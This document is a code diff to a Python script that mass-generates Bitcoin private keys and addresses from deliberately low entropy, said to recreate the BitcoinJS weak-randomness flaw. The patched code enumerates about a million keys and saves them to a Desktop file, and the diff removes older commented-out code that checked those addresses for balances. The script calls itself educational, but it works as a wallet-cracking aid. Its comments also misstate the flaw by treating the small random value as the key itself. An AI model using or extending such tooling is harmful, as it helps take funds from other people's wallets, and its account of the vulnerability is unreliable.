@@ -16,19 +16,23 @@ import time
 from typing import Dict, List, Tuple
 import json
 
+from ecdsa.util import entropy_to_bits
+
 
 class BitcoinJSVulnerabilityRecreator:
-    def __init__(self):
+    def __init__(self, entropy_bits: int = 16):
         self.secp256k1 = ecdsa.SECP256k1
+        self.entropy_bits = entropy_bits
+        self.max_random_value = 2 ** entropy_bits
         self.checked_addresses = []
+        if entropy_bits > 256:
+            raise ValueError("Entropy cannot exceed 256 bits for Bitcoin private keys")
 
     def simulate_weak_random(self, seed_value: int) -> int:
         """
-        Simulates the weak Math.random() behavior from BitcoinJS
-        where only 65,536 values were possible
+        Simulate weak randomness based on entropy bit size (default: 16-bit)
         """
-        # Original vulnerability: Math.random() * 65536 gave only 65536 possible values
-        return seed_value % 65536
+        return seed_value % self.max_random_value
 
     def generate_private_key_from_weak_random(self, weak_random_value: int) -> bytes:
         """
@@ -37,6 +41,15 @@ class BitcoinJSVulnerabilityRecreator:
         # Convert the weak random value to a private key
         # This mimics how BitcoinJS converted the limited random values
         private_key_int = weak_random_value
+
+        # Handle edge case: private key cannot be 0 or >= curve order
+        # For SECP256k1, valid range is 1 to n-1 where n is the curve order
+        secp256k1_order = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
+
+        if private_key_int == 0:
+            private_key_int = 1  # Use 1 instead of 0
+        elif private_key_int >= secp256k1_order:
+            private_key_int = private_key_int % (secp256k1_order - 1) + 1
 
         # Pad to 32 bytes (256 bits) - this was part of the vulnerability
         # The actual entropy was only 16 bits but padded to look like 256 bits
@@ -256,12 +269,18 @@ def main():
     print("⚠️  This is for educational/recovery purposes only.")
     print("=" * 50)
 
-    recreator = BitcoinJSVulnerabilityRecreator()
+    # Change entropy here (e.g., 17 bits)
+    entropy_bits = 20
+    recreator = BitcoinJSVulnerabilityRecreator(entropy_bits=entropy_bits)
 
     # Example: Generate a few specific wallets
     print("\n🔍 Generating sample vulnerable wallets:")
     for seed in [0, 1, 1337, 12345, 65535]:
         wallet = recreator.generate_vulnerable_wallet(seed)
+        if 'error' in wallet:
+            print(f"\nSeed {seed}: ERROR - {wallet['error']}")
+            continue
+
         print(f"\nSeed {seed}:")
         print(f"  Private Key: {wallet['private_key_hex']}")
         print(f"  P2PKH (compressed):   {wallet['p2pkh_compressed']}")
@@ -276,23 +295,30 @@ def main():
     print("  • Most vulnerable period: May 2011 - March 2012 (P2PKH only)")
     print("  • Late vulnerable period: April 2012+ (P2PKH + P2SH)")
 
-    # Uncomment below to scan a range and check blockchain
-    # WARNING: This will make many API calls and may take time
+    import os
 
-    # print("\n🚀 Starting vulnerability scan...")
-    # results, interesting = recreator.scan_vulnerable_range(
-    #     start=0,
-    #     end=1000,  # Start small for testing
-    #     check_blockchain=True,
-    #     delay=0.2  # Be nice to the API
-    # )
+    # Create and save wallet info to Desktop
+    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+    output_file = os.path.join(desktop_path, "vulnerable_wallets.json")
 
-    # if interesting:
-    #     print(f"\n🎯 Found {len(interesting)} wallets with activity!")
-    #     for item in interesting[:5]:  # Show first 5
-    #         wallet = item['wallet']
-    #         balance_info = item['balance_info']
-    #         print(f"Seed {wallet['seed_value']}: {balance_info['balance']} sats")
+    # Generate sample wallets to save
+
+    sample_wallets = []
+    start = 0
+    max_random_value = 2 ** entropy_bits
+
+    for idx, seed in enumerate(range(start, max_random_value), 1):
+        wallet = recreator.generate_vulnerable_wallet(seed)
+        if 'error' not in wallet:
+            sample_wallets.append(wallet)
+
+        # Print status every 1000 keys or on last iteration
+        if idx % 5000 == 0 or idx == max_random_value:
+            percent = (idx / max_random_value) * 100
+            print(f"🔑 Generated {idx} of {max_random_value} wallets ({percent:.2f}%)")
+
+    # Save to Desktop
+    recreator.save_results(sample_wallets, filename=output_file)
 
     print("\n✨ Script complete!")
 
